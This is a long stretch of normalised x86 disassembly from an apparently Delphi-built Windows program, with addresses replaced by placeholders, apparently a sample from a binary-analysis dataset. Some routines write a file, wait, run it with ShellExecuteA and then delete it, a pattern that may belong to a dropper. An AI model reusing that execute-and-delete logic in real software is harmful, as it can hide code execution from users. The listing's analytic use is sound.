mov [ eax ] ebx
mov cl 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d4f8
mov ebx eax
mov eax [ rw-data ]
mov [ eax + 0x36c ] ebx
mov [ ebx + 0xf ] 0x1
mov eax ebx
call sub_41d988
jmp r-xdata
lea eax [ ebp - 0x23c ]
call sub_45e31c
mov edx [ ebp - 0x23c ]
mov eax [ rw-data ]
call sub_4057bc
inc [ ebp - 0x34 ]
dec [ ebp - 0x3c ]
jne r-xdata
mov eax [ rw-data ]
push [ eax ]
lea ecx [ ebp - 0x234 ]
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x234 ]
lea edx [ ebp - 0x230 ]
call sub_4093d8
mov edx [ ebp - 0x230 ]
lea eax [ ebp - 0x22c ]
call sub_4057bc
push [ ebp - 0x22c ]
push r-xdata
mov eax [ rw-data ]
mov edx 0x3
call sub_405858
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov cl 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d4f8
mov ebx eax
mov eax [ rw-data ]
mov [ eax + 0x36c ] ebx
mov [ ebx + 0xf ] 0x1
mov eax ebx
call sub_41d988
jmp r-xdata
lea eax [ ebp - 0x278 ]
call sub_45e31c
mov edx [ ebp - 0x278 ]
mov eax [ rw-data ]
call sub_4057bc
inc [ ebp - 0x34 ]
dec [ ebp - 0x3c ]
jne r-xdata
mov eax [ rw-data ]
push [ eax ]
lea ecx [ ebp - 0x270 ]
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x270 ]
lea edx [ ebp - 0x26c ]
call sub_4093d8
mov edx [ ebp - 0x26c ]
lea eax [ ebp - 0x268 ]
call sub_4057bc
push [ ebp - 0x268 ]
push r-xdata
mov eax [ rw-data ]
mov edx 0x3
call sub_405858
mov eax [ rw-data ]
push eax
lea edx [ esi + 0x1 ]
mov ecx ebx
mov eax [ ebp - 0x18 ]
call sub_405384
sub ebx 0x4
mov ebx [ ebx ]
push [ ebp - 0x10 ]
push [ ebp - 0x18 ]
push r-xdata
lea edx [ ebp - 0x28c ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x28c ]
push r-xdata
lea eax [ ebp - 0x10 ]
mov edx 0x5
call sub_4051e4
push [ ebp - 0x10 ]
push [ ebp - 0x18 ]
push r-xdata
lea edx [ ebp - 0x288 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x288 ]
push r-xdata
lea eax [ ebp - 0x10 ]
mov edx 0x5
call sub_4051e4
jmp r-xdata
mov ebx eax
push ebx
lea eax [ ebp - 0x20 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
test ebx ebx
jle r-xdata
sub eax 0x4
mov eax [ eax ]
lea ecx [ ebp - 0x2b0 ]
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x2b0 ]
lea edx [ ebp - 0x2ac ]
call sub_4093d8
cmp [ ebp - 0x2ac ] 0x0
je r-xdata
mov eax [ rw-data ]
push [ eax + 0x39c ]
push r-xdata
lea edx [ ebp - 0x2ec ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x2ec ]
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_4051e4
mov eax [ rw-data ]
push [ eax + 0x39c ]
push r-xdata
lea edx [ ebp - 0x2e8 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x2e8 ]
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_4051e4
jmp r-xdata
mov ebx eax
push ebx
lea eax [ ebp - 0x20 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
test ebx ebx
jle r-xdata
sub eax 0x4
mov eax [ eax ]
lea ecx [ ebp - 0x310 ]
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x310 ]
lea edx [ ebp - 0x30c ]
call sub_4093d8
cmp [ ebp - 0x30c ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
call sub_409df4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax ebx
call sub_420e2c
lea eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_40512c
inc esi
dec [ ebp - 0x40 ]
jne r-xdata
lea ecx [ ebp - 0x42c ]
mov edx esi
mov eax [ ebp - 0x28 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x42c ]
mov eax ebx
call sub_421678
lea edx [ ebp - 0x18 ]
call sub_40987c
push [ ebp - 0x10 ]
push r-xdata
push [ ebp - 0x18 ]
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_4051e4
lea ecx [ ebp - 0x428 ]
mov edx esi
mov eax [ ebp - 0x28 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x428 ]
mov eax ebx
call sub_4215a8
cmp al 0x3
jne r-xdata
xor esi esi
jmp r-xdata
mov eax [ rw-data ]
push [ eax + 0x39c ]
push r-xdata
lea edx [ ebp - 0x52c ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x52c ]
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_4051e4
mov eax [ rw-data ]
push [ eax + 0x39c ]
push r-xdata
lea edx [ ebp - 0x528 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x528 ]
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_4051e4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ ebp - 0x35 ] 0x0
jne r-xdata
push [ ebp - 0x10 ]
push [ ebp - 0x18 ]
push r-xdata
lea edx [ ebp - 0x204 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x204 ]
push r-xdata
lea eax [ ebp - 0x10 ]
mov edx 0x5
call sub_4051e4
jmp r-xdata
lea ecx [ ebp - 0x228 ]
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x228 ]
lea edx [ ebp - 0x224 ]
call sub_4093d8
cmp [ ebp - 0x224 ] 0x0
je r-xdata
lea ecx [ ebp - 0x264 ]
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x264 ]
lea edx [ ebp - 0x260 ]
call sub_4093d8
cmp [ ebp - 0x260 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x39c ]
lea eax [ ebp - 0x18c ]
call sub_403504
mov edx 0x1
lea eax [ ebp - 0x18c ]
call sub_4038cc
call sub_402e84
test ebx ebx
jle r-xdata
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x34 ] 0x1
push r-xdata
lea ecx [ ebp - 0x2f8 ]
mov eax [ rw-data ]
mov eax [ eax + 0x360 ]
mov eax [ eax + 0x270 ]
mov edx [ ebp - 0x30 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
push [ ebp - 0x2f8 ]
push r-xdata
lea eax [ ebp - 0x2f4 ]
mov edx 0x3
call sub_4051e4
mov eax [ ebp - 0x2f4 ]
lea edx [ ebp - 0x2f0 ]
call sub_45dfa8
mov edx [ ebp - 0x2f0 ]
mov eax [ rw-data ]
add eax 0x39c
call sub_404e98
mov eax [ rw-data ]
mov edx [ eax + 0x39c ]
mov eax [ ebp - 0x10 ]
call sub_45e5e0
jmp r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x39c ]
lea eax [ ebp - 0x18c ]
call sub_403504
mov edx 0x1
lea eax [ ebp - 0x18c ]
call sub_4038cc
call sub_402e84
test ebx ebx
jle r-xdata
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x34 ] 0x1
cmp [ ebp - 0x35 ] 0x0
jne r-xdata
push [ ebp - 0x10 ]
push [ ebp - 0x18 ]
push r-xdata
lea edx [ ebp - 0x34c ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x34c ]
push r-xdata
lea eax [ ebp - 0x10 ]
mov edx 0x5
call sub_4051e4
jmp r-xdata
push [ ebp - 0x10 ]
push r-xdata
lea ecx [ ebp - 0x40c ]
mov edx esi
mov eax [ ebp - 0x28 ]
mov edi [ eax ]
call [ edi + 0xc ]
push [ ebp - 0x40c ]
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_4051e4
push [ ebp - 0x1c ]
push r-xdata
lea ecx [ ebp - 0x414 ]
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
push [ ebp - 0x414 ]
lea eax [ ebp - 0x410 ]
mov edx 0x3
call sub_4051e4
mov edx [ ebp - 0x410 ]
xor ecx ecx
mov eax ebx
call sub_420ec4
lea ecx [ ebp - 0x418 ]
mov edx esi
mov eax [ ebp - 0x28 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x418 ]
mov eax ebx
call sub_4215a8
cmp al 0x1
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x39c ]
call sub_45e474
cmp edx 0x0
jne r-xdata
push r-xdata
lea ecx [ ebp - 0x538 ]
mov eax [ rw-data ]
mov eax [ eax + 0x360 ]
mov eax [ eax + 0x270 ]
mov edx [ ebp - 0x30 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
push [ ebp - 0x538 ]
push r-xdata
lea eax [ ebp - 0x534 ]
mov edx 0x3
call sub_4051e4
mov eax [ ebp - 0x534 ]
lea edx [ ebp - 0x530 ]
call sub_45dfa8
mov edx [ ebp - 0x530 ]
mov eax [ rw-data ]
add eax 0x39c
call sub_404e98
mov eax [ rw-data ]
mov edx [ eax + 0x39c ]
mov eax [ ebp - 0x10 ]
call sub_45e5e0
jmp r-xdata
push [ ebp - 0x10 ]
push [ ebp - 0x18 ]
push r-xdata
lea edx [ ebp - 0x208 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x208 ]
push r-xdata
lea eax [ ebp - 0x10 ]
mov edx 0x5
call sub_4051e4
lea eax [ ebp - 0x18c ]
call sub_4035c0
call sub_402e84
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x34 ] 0x1
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x34 ]
movzx eax [ eax + edx - 0x1 ]
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0x34 ]
mov [ edx + ecx - 0x1 ] al
inc [ ebp - 0x34 ]
dec [ ebp - 0x3c ]
jne r-xdata
lea eax [ ebp - 0x18c ]
call sub_4035c0
call sub_402e84
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x34 ] 0x1
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x34 ]
movzx eax [ eax + edx - 0x1 ]
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0x34 ]
mov [ edx + ecx - 0x1 ] al
inc [ ebp - 0x34 ]
dec [ ebp - 0x3c ]
jne r-xdata
push [ ebp - 0x10 ]
push [ ebp - 0x18 ]
push r-xdata
lea edx [ ebp - 0x350 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x350 ]
push r-xdata
lea eax [ ebp - 0x10 ]
mov edx 0x5
call sub_4051e4
jg r-xdata
cmp eax 0x0
ja r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x39c ]
call sub_409df4
test al al
je r-xdata
mov eax [ ebp - 0x20 ]
mov edx [ ebp - 0x34 ]
movzx eax [ eax + edx - 0x1 ]
mov [ ebp - 0x29 ] al
lea edx [ ebp - 0x29 ]
lea eax [ ebp - 0x18c ]
call sub_4039ac
call sub_402e84
inc [ ebp - 0x34 ]
dec [ ebp - 0x3c ]
jne r-xdata
mov eax 0x1388
call sub_49f864
mov eax [ rw-data ]
mov eax [ eax + 0x39c ]
call sub_409df4
test al al
je r-xdata
mov eax [ ebp - 0x20 ]
mov edx [ ebp - 0x34 ]
movzx eax [ eax + edx - 0x1 ]
mov [ ebp - 0x29 ] al
lea edx [ ebp - 0x29 ]
lea eax [ ebp - 0x18c ]
call sub_4039ac
call sub_402e84
inc [ ebp - 0x34 ]
dec [ ebp - 0x3c ]
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0x28 ] eax
xor eax eax
push ebp
push sub_4a27a5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov edx [ eax + 0x39c ]
mov eax [ ebp - 0x28 ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
lea ecx [ ebp - 0x4f4 ]
mov edx 0xd
mov al 0x2d
call sub_405610
mov ecx [ ebp - 0x4f4 ]
xor edx edx
mov eax [ ebp - 0x28 ]
mov ebx [ eax ]
call [ ebx + 0x60 ]
push r-xdata
lea edx [ ebp - 0x4fc ]
mov eax [ ebp - 0x18 ]
call sub_409048
push [ ebp - 0x4fc ]
push r-xdata
lea eax [ ebp - 0x4f8 ]
mov edx 0x3
call sub_4051e4
mov ecx [ ebp - 0x4f8 ]
xor edx edx
mov eax [ ebp - 0x28 ]
mov ebx [ eax ]
call [ ebx + 0x60 ]
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x28 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
lea eax [ ebp - 0x18 ]
mov edx [ rw-data ]
mov edx [ edx + 0x39c ]
call sub_404edc
mov eax [ rw-data ]
push [ eax + 0x3c4 ]
lea edx [ ebp - 0x504 ]
mov eax r-xdata
call sub_45ec84
mov eax [ ebp - 0x504 ]
lea edx [ ebp - 0x500 ]
call sub_409048
push [ ebp - 0x500 ]
lea eax [ ebp - 0x508 ]
call sub_45e504
push [ ebp - 0x508 ]
mov eax 0x3e7
call sub_403220
inc eax
lea edx [ ebp - 0x50c ]
call sub_40987c
push [ ebp - 0x50c ]
lea edx [ ebp - 0x510 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x510 ]
mov eax [ rw-data ]
add eax 0x39c
mov edx 0x5
call sub_4051e4
mov eax [ rw-data ]
mov edx [ eax + 0x39c ]
mov eax [ ebp - 0x10 ]
call sub_45e5e0
push 0x1388
call Sleep
mov eax [ ebp - 0x18 ]
call sub_405324
push eax
call DeleteFileA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x28 ]
call sub_403f64
retn
cmp esi 0x1e
jl r-xdata
jmp r-xdata
mov eax [ rw-data ]
push [ eax + 0x39c ]
push r-xdata
lea edx [ ebp - 0x2c8 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x2c8 ]
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_4051e4
mov eax [ rw-data ]
push [ eax + 0x39c ]
push r-xdata
lea edx [ ebp - 0x2c4 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x2c4 ]
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_4051e4
jmp r-xdata
mov eax [ rw-data ]
push [ eax + 0x39c ]
push r-xdata
lea edx [ ebp - 0x32c ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x32c ]
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_4051e4
xor eax eax
push ebp
push sub_4a119a
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x39c ]
call sub_405324
push eax
push 0x0
push 0x0
call ShellExecuteA
mov eax [ rw-data ]
push [ eax + 0x39c ]
push r-xdata
lea edx [ ebp - 0x324 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x324 ]
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_4051e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push 0xfa0
call Sleep
inc esi
push r-xdata
lea ecx [ ebp - 0x2d4 ]
mov eax [ rw-data ]
mov eax [ eax + 0x360 ]
mov eax [ eax + 0x270 ]
mov edx [ ebp - 0x30 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
push [ ebp - 0x2d4 ]
push r-xdata
lea eax [ ebp - 0x2d0 ]
mov edx 0x3
call sub_4051e4
mov eax [ ebp - 0x2d0 ]
lea edx [ ebp - 0x2cc ]
call sub_45dfa8
mov edx [ ebp - 0x2cc ]
mov eax [ rw-data ]
add eax 0x39c
call sub_404e98
mov eax [ rw-data ]
mov edx [ eax + 0x39c ]
mov eax [ ebp - 0x10 ]
call sub_45e5e0
jmp r-xdata
push r-xdata
lea ecx [ ebp - 0x338 ]
mov eax [ rw-data ]
mov eax [ eax + 0x360 ]
mov eax [ eax + 0x270 ]
mov edx [ ebp - 0x30 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
push [ ebp - 0x338 ]
push r-xdata
lea eax [ ebp - 0x334 ]
mov edx 0x3
call sub_4051e4
mov eax [ ebp - 0x334 ]
lea edx [ ebp - 0x330 ]
call sub_45dfa8
mov edx [ ebp - 0x330 ]
mov eax [ rw-data ]
add eax 0x39c
call sub_404e98
mov eax [ rw-data ]
mov edx [ eax + 0x39c ]
mov eax [ ebp - 0x10 ]
call sub_45e5e0
jmp r-xdata
sub_4a35d4
push ebp
mov ebp esp
push ecx
mov ecx 0x9
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_405314
mov eax [ ebp - 0x8 ]
call sub_405314
xor eax eax
push ebp
push sub_4a3872
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1c ] 0x1388
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4650b8
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_473590
mov [ ebp - 0x18 ] eax
xor edx edx
push ebp
push sub_4a382e
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_40a12c
mov eax [ ebp - 0x4 ]
call sub_45e474
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp - 0x28 ] 0x7a120
jbe r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
mov [ ebp - 0x1c ] 0x2710
jmp r-xdata
jle r-xdata
cmp [ ebp - 0x28 ] 0xf4240
jbe r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
mov [ ebp - 0x1c ] 0x3a98
jmp r-xdata
jle r-xdata
cmp [ ebp - 0x28 ] 0x1e8480
jbe r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
mov [ ebp - 0x1c ] 0x7530
jmp r-xdata
jle r-xdata
cmp [ ebp - 0x28 ] r--data
jbe r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
mov [ ebp - 0x1c ] 0xea60
jmp r-xdata
jle r-xdata
cmp [ ebp - 0x28 ] 0x989680
jbe r-xdata
mov ebx [ ebp - 0xc ]
mov eax ebx
test eax eax
je r-xdata
mov [ ebp - 0x1c ] 0x493e0
jmp r-xdata
cmp eax 0x32
jle r-xdata
sub eax 0x4
mov eax [ eax ]
mov eax [ rw-data ]
mov eax [ eax + 0x3c4 ]
mov edx [ ebp - 0xc ]
call sub_405468
dec eax
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_40a164
test ebx ebx
je r-xdata
lea edx [ ebp - 0x3c ]
mov eax [ ebp - 0xc ]
call sub_45ebf0
mov edx [ ebp - 0x3c ]
lea eax [ ebp - 0xc ]
call sub_404edc
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0xc ]
call sub_45ebf0
mov eax [ ebp - 0x34 ]
push eax
lea edx [ ebp - 0x38 ]
mov eax r-xdata
call sub_45ec84
mov edx [ ebp - 0x38 ]
lea eax [ ebp - 0xc ]
pop ecx
call sub_405170
jmp r-xdata
mov esi [ ebp - 0x10 ]
test esi esi
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a3835
mov eax [ ebp - 0x18 ]
call sub_403f64
retn
mov eax [ rw-data ]
push [ eax + 0x3c4 ]
push [ ebp - 0xc ]
lea edx [ ebp - 0x44 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x44 ]
lea eax [ ebp - 0x40 ]
mov edx 0x3
call sub_4051e4
mov eax [ ebp - 0x40 ]
push eax
lea edx [ ebp - 0x48 ]
mov eax r-xdata
call sub_45ec84
mov edx [ ebp - 0x48 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x18 ]
call sub_47369c
xor eax eax
push ebp
push j_sub_404444#2
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x29 ] 0x0
lea eax [ ebp - 0x4c ]
push eax
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
call sub_489850
mov eax [ ebp - 0x4c ]
call sub_49fcc0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
mov ecx ebx
sub ecx esi
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_405384
mov edx [ ebp - 0x30 ]
lea eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
call sub_405170
sub esi 0x4
mov esi [ esi ]
sub_4a3835
mov eax [ ebp - 0x14 ]
call sub_403f64
mov eax [ ebp - 0x1c ]
push eax
call Sleep
movzx ebx [ ebp - 0x29 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a3879
lea eax [ ebp - 0x4c ]
mov edx 0x8
call sub_404e68
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_404e68
retn
sub_4a38cc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_405314
xor eax eax
push ebp
push sub_4a39b3
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4a3920
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ rw-data ]
mov edx [ edx + 0x14 ]
movzx ecx [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_4a35d4
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
push ebp
push sub_4a395d
push [ fs : eax ]
mov [ fs : eax ] esp
test bl bl
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x18 ]
movzx ecx [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_4a35d4
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a39ba
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
xor eax eax
push ebp
push j_sub_404444
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_405324
push eax
call DeleteFileA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_4a39c4
push ebp
mov ebp esp
mov ecx 0xf
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4a3e17
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_45e050
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a3e1e
lea eax [ ebp - 0x7c ]
mov edx 0x19
call sub_404e68
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_404e68
retn
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
lea eax [ ebp - 0x20 ]
call sub_45e1ec
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x1c ]
call sub_4090e4
mov edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_404e98
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov edx [ rw-data ]
mov [ edx ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov edx [ rw-data ]
mov [ edx ] eax
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
lea eax [ ebp - 0x24 ]
mov edx [ rw-data ]
mov edx [ edx ]
call sub_4050e8
mov edx [ ebp - 0x24 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
lea eax [ ebp - 0x4c ]
mov edx [ rw-data ]
mov edx [ edx ]
call sub_4050e8
mov edx [ ebp - 0x4c ]
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax [ rw-data ]
push [ eax + 0x3c4 ]
lea edx [ ebp - 0x38 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x38 ]
lea eax [ ebp - 0x3c ]
call sub_45e504
push [ ebp - 0x3c ]
push r-xdata
mov eax 0x3e7
call sub_403220
inc eax
lea edx [ ebp - 0x40 ]
call sub_40987c
push [ ebp - 0x40 ]
push r-xdata
mov eax [ rw-data ]
mov edx 0x6
call sub_4051e4
lea edx [ ebp - 0x44 ]
mov eax r-xdata
call sub_45dfa8
mov edx [ ebp - 0x44 ]
mov eax [ rw-data ]
call sub_404e98
lea edx [ ebp - 0x48 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x48 ]
mov edx [ rw-data ]
mov edx [ edx ]
call sub_45e5e0
inc eax
mov [ ebp - 0x18 ] eax
xor ebx ebx
lea edx [ ebp - 0x78 ]
mov eax r-xdata
call sub_45dfa8
mov edx [ ebp - 0x78 ]
mov eax [ rw-data ]
call sub_404e98
lea edx [ ebp - 0x7c ]
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x7c ]
mov edx [ rw-data ]
mov edx [ edx ]
call sub_45e5e0
mov eax [ rw-data ]
mov eax [ eax ]
call sub_403f64
mov eax [ rw-data ]
mov eax [ eax ]
call sub_403f64
inc eax
mov [ ebp - 0x18 ] eax
xor ebx ebx
inc ebx
dec [ ebp - 0x18 ]
jne r-xdata
lea ecx [ ebp - 0x34 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x34 ]
lea edx [ ebp - 0x30 ]
call sub_4090e4
mov eax [ ebp - 0x30 ]
lea edx [ ebp - 0x8 ]
call sub_4093d8
mov [ ebp - 0x14 ] 0xffffffff
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
inc ebx
dec [ ebp - 0x18 ]
jne r-xdata
lea ecx [ ebp - 0x58 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x58 ]
call sub_409df4
test al al
je r-xdata
lea ecx [ ebp - 0x2c ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x28 ]
call sub_4093d8
cmp [ ebp - 0x28 ] 0x0
je r-xdata
mov edx eax
test edx edx
jl r-xdata
sub eax 0x4
mov eax [ eax ]
lea ecx [ ebp - 0x54 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x54 ]
lea edx [ ebp - 0x50 ]
call sub_4093d8
cmp [ ebp - 0x50 ] 0x0
je r-xdata
lea ecx [ ebp - 0x70 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0xc ]
push [ ebp - 0x70 ]
push r-xdata
lea edx [ ebp - 0x74 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x74 ]
lea eax [ ebp - 0x6c ]
mov edx 0x3
call sub_4051e4
mov ecx [ ebp - 0x6c ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0x20 ]
lea ecx [ ebp - 0x5c ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x5c ]
xor edx edx
call sub_4a38cc
lea ecx [ ebp - 0x64 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
